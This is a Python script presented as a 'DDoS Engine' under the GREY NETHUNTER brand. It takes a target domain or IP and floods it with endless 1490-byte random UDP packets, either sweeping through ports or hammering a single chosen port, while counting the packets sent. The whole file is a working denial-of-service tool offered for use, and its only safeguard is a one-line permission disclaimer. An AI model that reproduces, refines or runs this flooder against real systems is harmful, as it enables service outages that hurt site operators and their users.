""" Copyright (c) 2024-2025 GREY NETHUNTER 
    Rebranded & Enhanced Aesthetics """

from platform import system
from tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet

version = "9.9"

uname = system()
cmd_clear = 'cls' if uname == "Windows" else 'clear'
os.system(cmd_clear)

# ==================== PREMIUM GREY BANNER ====================
G = "\033[90m"   # Dark Grey
W = "\033[97m"   # White
R = "\033[91m"   # Red
C = "\033[96m"   # Cyan
X = "\033[0m"    # Reset

print(f"""{G}
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▒                                              ▒▓
▓▒             {W}██████╗ ██████╗ ███████╗██╗   ██╗{G}          ▒▓
▓▒             {W}██╔════╝ ██╔══██╗██╔════╝╚██╗ ██╔╝{G}          ▒▓
▓▒             {W}██║  ███╗██████╔╝█████╗   ╚████╔╝ {G}          ▒▓
▓▒             {W}██║   ██║██╔══██╗██╔══╝    ╚██╔╝  {G}          ▒▓
▓▒             {W}╚██████╔╝██║  ██║███████╗   ██║   {G}          ▒▓
▓▒             {W} ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   {G}          ▒▓
▓▒                                              ▒▓
▓▒          {C}>>> DDoS Engine  | BY GREY NETHUNTER <<<{G}         ▒▓
▓▒            {R}root@grey:~# access granted{G}             ▒▓
▓▒                                              ▒▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{X}
""")
# =============================================================

bytes_data = random._urandom(1490)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while True:
    print(f"\n{W}                        Author: GREY (DEVELOPER GREY NETHUNTER){G}")
    print(f"{R}WARNING: Use only on systems you own or have explicit permission!{G}")
    print(f"\n1. Website Domain\n2. IP Address\n3. About\n4. Exit{G}")
    opt = input(f"\n{C}> {X}")

    if opt == '1':
        domain = input(f"{C}Domain: {X}")
        ip = socket.gethostbyname(domain)
        break
    elif opt == '2':
        ip = input(f"{C}IP Address: {X}")
        break
    elif opt == '3':
        print(f"\n{G}This tool has been rebranded as {W}GREY{G} nethunter.")
        print(f"Original Creator: GREY NETHUNTER")
        print(f"Contact: Telegram @anonymous_store_acs{X}")
        input(f"\nPress Enter to continue...")
        os.system(cmd_clear)
    elif opt == '4':
        exit()
    else:
        print(f'{R}Invalid Choice!{X}')
        time.sleep(2)
        os.system(cmd_clear)

port_mode = False
port = 2

while True:
    port_bool = input(f"{C}Certain port? [y/n]: {X}").lower()
    if port_bool == "y":
        port_mode = True
        port = int(input(f"{C}Port: {X}"))
        break
    elif port_bool == "n":
        break
    else:
        print(f'{R}Invalid Choice!{X}')
        time.sleep(2)

os.system(cmd_clear)
print(f'{C}INITIALIZING GREY ENGINE....{X}')
time.sleep(1)
print(f'{W}STARTING ATTACK...')
time.sleep(4)

sent = 0

if not port_mode:
    try:
        while True:
            if port >= 65534:
                port = 1
            elif port == 1900:
                port = 1901
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port += 1
            print(f"\033[32;1mSent {sent} packets to {ip} through port: {port}\033[0m")
    except KeyboardInterrupt:
        print(f'\n{R}Attack stopped by GREY{X}')

else:
    if port < 2 or port >= 65534:
        port = 2
    elif port == 1900:
        port = 1901
    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print(f"\033[32;1mSent {sent} packets to {ip} through port: {port}\033[0m")
    except KeyboardInterrupt:
        print(f'\n{R}Attack stopped by GREY{X}')